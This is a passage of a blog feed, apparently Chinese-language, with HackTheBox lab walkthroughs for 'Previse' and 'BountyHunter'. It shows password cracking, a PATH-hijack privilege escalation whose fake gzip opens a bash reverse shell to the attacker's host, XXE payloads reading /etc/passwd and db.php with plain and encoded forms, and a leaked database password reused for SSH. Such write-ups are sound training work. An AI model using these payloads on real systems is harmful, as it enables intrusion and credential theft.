variants) [MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">ilovecody112235! (?)</span><br><span class="line">1g 0:00:05:50 DONE (2021-08-16 07:03) 0.002855g/s 21171p/s 21171c/s 21171C/s ilovecodydean..ilovecody..</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# cat userhash   </span><br><span class="line"><span class="meta">$</span><span class="bash">1$🧂llol<span class="variable">$DQpmdvnb7EeuO6UaqRItf</span>.</span></span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x09-ssh登入"><a href="#0x09-ssh登入" class="headerlink" title="0x09.ssh登入"></a>0x09.ssh登入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# ssh m4lwhere@10.10.11.104</span><br><span class="line">m4lwhere@10.10.11.104&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Aug 16 11:15:27 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.1               Processes:           241</span><br><span class="line">  Usage of /:   49.4% of 4.85GB   Users logged in:     0</span><br><span class="line">  Memory usage: 26%               IP address for eth0: 10.10.11.104</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5</span><br><span class="line">m4lwhere@previse:~$ pwd</span><br><span class="line">/home/m4lwhere</span><br><span class="line">m4lwhere@previse:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">m4lwhere@previse:~$ cat user.txt </span><br><span class="line">********************************</span><br><span class="line">m4lwhere@previse:~$ </span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><p><code>sudo -l提权</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;htb&#x2F;Previse]</span><br><span class="line">└─# ssh m4lwhere@10.10.11.104</span><br><span class="line">m4lwhere@10.10.11.104&#39;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.5 LTS (GNU&#x2F;Linux 4.15.0-151-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Aug 16 12:06:54 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           174</span><br><span class="line">  Usage of &#x2F;:   49.4% of 4.85GB   Users logged in:     0</span><br><span class="line">  Memory usage: 20%               IP address for eth0: 10.10.11.104</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5</span><br><span class="line">m4lwhere@previse:~$ sudo -l</span><br><span class="line">[sudo] password for m4lwhere: </span><br><span class="line">User m4lwhere may run the following commands on previse:</span><br><span class="line">    (root) &#x2F;opt&#x2F;scripts&#x2F;access_backup.sh</span><br><span class="line">m4lwhere@previse:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>查看/opt/scripts/access_backup.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> We always make sure to store logs, we take security SERIOUSLY here</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> I know I shouldnt run this as root but I cant figure it out programmatically on my account</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is configured to run with cron, added to sudo so I can run as needed - we<span class="string">&#x27;ll fix it later when there&#x27;</span>s time</span></span><br><span class="line"></span><br><span class="line">gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz</span><br><span class="line">gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</span><br><span class="line">m4lwhere@previse:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>利用gzip路径滥用构建payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">m4lwhere@previse:~$ cd /tmp</span><br><span class="line">m4lwhere@previse:/tmp$ ls</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-apache2.service-SHI4Vf</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-systemd-resolved.service-c4hkjA</span><br><span class="line">systemd-private-d085308c77194968bd2248c5047e9e7d-systemd-timesyncd.service-oovQQq</span><br><span class="line">vmware-root_904-2697008433</span><br><span class="line">m4lwhere@previse:/tmp$ echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">m4lwhere@previse:/tmp$ vim gzip</span><br><span class="line">m4lwhere@previse:/tmp$ cat gzip</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.17.216/8888 0&gt;&amp;1</span><br><span class="line">m4lwhere@previse:/tmp$ chmod +x gzip </span><br><span class="line">m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH</span><br><span class="line">m4lwhere@previse:/tmp$ echo $PATH</span><br><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 51322</span><br><span class="line">root@previse:/tmp# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@previse:/tmp# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@previse:~# cd /root</span><br><span class="line">cd /root</span><br><span class="line">root@previse:/root# ls</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@previse:/root# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">************************</span><br><span class="line">root@previse:/root# </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/08/16/HTB-Previse/image-20210816113010834.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-BountyHunter</title>
    <link href="https://lunamoore.github.io/2021/08/15/HTB-BountyHunter/"/>
    <id>https://lunamoore.github.io/2021/08/15/HTB-BountyHunter/</id>
    <published>2021-08-15T12:09:34.000Z</published>
    <updated>2021-08-15T12:20:22.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/08/15/HTB-BountyHunter/image-20210814200854065.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到只开放了22与80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# nmap -sC -sV -sT 10.10.11.100 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 06:25 EDT</span><br><span class="line">Nmap scan report for 10.10.11.100</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)</span><br><span class="line">|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)</span><br><span class="line">|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Bounty Hunters</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.01 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>这是寻找hacker的平台，并提示使用burp</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814220805615.png" class><p><code>手动爬虫一下发现一个提交面板</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814221019084.png" class><h2 id="0x03-列一下目录"><a href="#0x03-列一下目录" class="headerlink" title="0x03.列一下目录"></a>0x03.列一下目录</h2><p><code>发现db.php，推测这是一个数据库文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/vpn]</span><br><span class="line">└─# gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.100</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 01:21:23 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]</span><br><span class="line">/index.php            (Status: 200) [Size: 25169]                                   </span><br><span class="line">/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]   </span><br><span class="line">/portal.php           (Status: 200) [Size: 125]                                     </span><br><span class="line">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]      </span><br><span class="line">/db.php               (Status: 200) [Size: 0]                                       </span><br><span class="line">/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]       </span><br><span class="line">/server-status        (Status: 403) [Size: 277]                                     </span><br><span class="line">                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 02:15:09 Finished</span><br><span class="line">===============================================================</span><br><span class="line">                                                        </span><br></pre></td></tr></table></figure><p><code>但是看不到内容</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210815134247833.png" class><h2 id="0x04-burp抓包"><a href="#0x04-burp抓包" class="headerlink" title="0x04.burp抓包"></a>0x04.burp抓包</h2><p><code>主页抓包没什么发现</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814221815307.png" class><p><code>抓一下log_submit.php，可以发现传输的数据被base64编码了</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814222058192.png" class><p><code>解码发现使用了xml进行传输</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210814222213318.png" class><h2 id="0x05-xml注入"><a href="#0x05-xml注入" class="headerlink" title="0x05.xml注入"></a>0x05.xml注入</h2><p><code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br></pre></td></tr></table></figure><p><code>base64编码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+ZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M+CgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+</span><br></pre></td></tr></table></figure><p><code>url编码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0%</span><span class="bash">2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2bZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M%2bCgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b</span></span><br></pre></td></tr></table></figure><p><code>成功利用，并发现development用户</code></p><img src="/2021/08/15/HTB-BountyHunter/image-20210815132443349.png" class><p><code>尝试获取/home/development/user.txt但是失败了</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/development/user.txt&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br><span class="line">        </span><br><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2hvbWUvZGV2ZWxvcG1lbnQvdXNlci50eHQiPl0+CgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU+Jnh4ZTs8L3RpdGxlPgoJCTxjd2U+ZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M+CgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+</span><br><span class="line"></span><br><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2hvbWUvZGV2ZWxvcG1lbnQvdXNlci50eHQiPl0%</span><span class="bash">2bCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2bJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2bZGVtbzwvY3dlPgoJCTxjdnNzPmRlbW88L2N2c3M%2bCgkJPHJld2FyZD5kZW1vPC9yZXdhcmQ%2bCgkJPC9idWdyZXBvcnQ%2b</span></span><br></pre></td></tr></table></figure><img src="/2021/08/15/HTB-BountyHunter/image-20210815132827777.png" class><h2 id="0x06-读取db-php"><a href="#0x06-读取db-php" class="headerlink" title="0x06.读取db.php"></a>0x06.读取db.php</h2><p><code>由于前面发现了db.php，但是不能查看，所以接下来尝试获取db.php文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE demo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;&gt;]&gt;</span><br><span class="line">        &lt;bugreport&gt;</span><br><span class="line">        &lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">        &lt;cwe&gt;demo&lt;/cwe&gt;</span><br><span class="line">        &lt;cvss&gt;demo&lt;/cvss&gt;</span><br><span class="line">        &lt;reward&gt;demo&lt;/reward&gt;</span><br><span class="line">        &lt;/bugreport&gt;</span><br><span class="line">        </span><br><span class="line">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgoJCTxidWdyZXBvcnQ+CgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmRlbW88L2N3ZT4KCQk8Y3Zzcz5kZW1vPC9jdnNzPgoJCTxyZXdhcmQ+ZGVtbzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==</span><br><span class="line"></span><br><span class="line"><span class="meta">PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRlbW8gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgoJCTxidWdyZXBvcnQ%</span><span class="bash">2bCgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPmRlbW88L2N3ZT4KCQk8Y3Zzcz5kZW1vPC9jdnNzPgoJCTxyZXdhcmQ%2bZGVtbzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3d%3d</span></span><br></pre></td></tr></table></figure><img src="/2021/08/15/HTB-BountyHunter/image-20210815133601924.png" class><p><code>解码，得到数据库用户密码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// TODO -&gt; Implement login system with the database.</span><br><span class="line"><span class="meta">$</span><span class="bash">dbserver = <span class="string">&quot;localhost&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbname = <span class="string">&quot;bounty&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbusername = <span class="string">&quot;admin&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbpassword = <span class="string">&quot;m19RoAU0hP41A1sTsq6K&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">testuser = <span class="string">&quot;test&quot;</span>;</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="0x07-爆破ssh"><a href="#0x07-爆破ssh" class="headerlink" title="0x07.爆破ssh"></a>0x07.爆破ssh</h2><blockquote><p>user：development</p><p>pass：m19RoAU0hP41A1sTsq6K</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/BountyHunter]</span><br><span class="line">└─# cat passwd.txt      </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span 